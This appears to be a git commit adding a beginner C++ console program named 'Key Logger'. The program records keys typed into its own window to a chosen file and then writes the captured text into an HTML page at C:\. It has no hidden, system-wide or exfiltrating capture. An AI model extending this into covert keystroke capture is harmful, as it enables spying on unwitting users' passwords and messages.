f03d6259beed647679aaf138daba5c80ef42569a
cMardc <130239955+cMardc@users.noreply.github.com>
2023-04-21 17:26:13 +0400

    Add files via upload

---
+++ Key Logger.h
@@ -0,0 +1,80 @@
+﻿#pragma once
+
+#include <iostream>
+#include <fstream>
+#include <Windows.h>
+#include <conio.h>
+#include <string>
+using namespace std;
+
+void setColour(string color)
+{
+	HANDLE col;
+	col = GetStdHandle(STD_OUTPUT_HANDLE);
+	int col_code = 7;
+	if (color == "blue")
+	{
+		col_code = 1;
+	}
+	else if (color == "green")
+	{
+		col_code = 2;
+	}
+	else if (color == "cyan")
+	{
+		col_code = 3;
+	}
+	else if (color == "red")
+	{
+		col_code = 4;
+	}
+	else if (color == "purple")
+	{
+		col_code = 5;
+	}
+	else if (color == "darkYellow")
+	{
+		col_code = 6;
+	}
+	else if (color == "white")
+	{
+		col_code = 7;
+	}
+	else if (color == "grey")
+	{
+		col_code = 8;
+	}
+	else if (color == "brightBlue")
+	{
+		col_code = 9;
+	}
+	else if (color == "brightGreen")
+	{
+		col_code = 10;
+	}
+	else if (color == "brightCyan")
+	{
+		col_code = 11;
+	}
+	else if (color == "brightRed")
+	{
+		col_code = 12;
+	}
+	else if (color == "pink")
+	{
+		col_code = 13;
+	}
+	else if (color == "yellow")
+	{
+		col_code = 14;
+	}
+	else if (color == "brightWhite")
+	{
+		col_code = 15;
+	}
+	else
+	{
+		col_code = 7;
+	}
+	SetConsoleTextAttribute(col, col_code);
+}
---
+++ source.cpp
@@ -0,0 +1,52 @@
+﻿#include "Key Logger.h"
+using namespace std;
+
+int main()
+{
+	string path;
+	cout << "Enter Path : ";
+	getline(cin, path);
+	ofstream keyLog(path);
+	string text;
+	bool working = keyLog.is_open();
+	if (!working)
+	{
+		setColour("red");
+		cout << "\nGiven Path Or Name Is Not Valid \n";
+		setColour("white");
+		return 0;
+	}
+	else
+	{
+		while (true)
+		{
+			if (_kbhit())
+			{
+				int a = getch();
+				char symbol = a;
+				keyLog << symbol;
+				text += symbol;
+				if (a == 13)
+				{
+					cout << endl;
+				}
+				else if (a == 27)
+				{
+					break;
+				}
+				else if (a == 9)
+				{
+					cout << "   [TAB]";
+					keyLog << "[TAB]";
+				}
+				cout << symbol;
+			}
+		}
+	}
+
+	ofstream style("C:\\style.css");
+	ofstream html("C:\\index.html");
+	style << "body{background: linear-gradient(black,darkgreen,green);background-repeat: no-repeat;background-attachment: fixed;}#Welcome{border-style: solid;border-color: rgb(46, 98, 28);border-radius: 10px;text-align: center;color:darkgreen}.texts{border-style: solid;border-color: rgb(46, 98, 28);border-radius: 10px;text-align: center;color:rgb(70, 216, 116)}";
+	html << "<!DOCTYPE html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content=IE=edge>   <meta name=viewport content=width=device-width, initial-scale=1.0><title>Key Logger</title><link rel=stylesheet href=style.css></head><body><div id=Welcome><h1 id=start> Welcome To KeyLogger Site!</h1><h2 id=start> This Is All The Information From Keylogger</h2></div><div class=texts><h1>" + text + "</h1></div></body></html>";
+	return 0;
+}
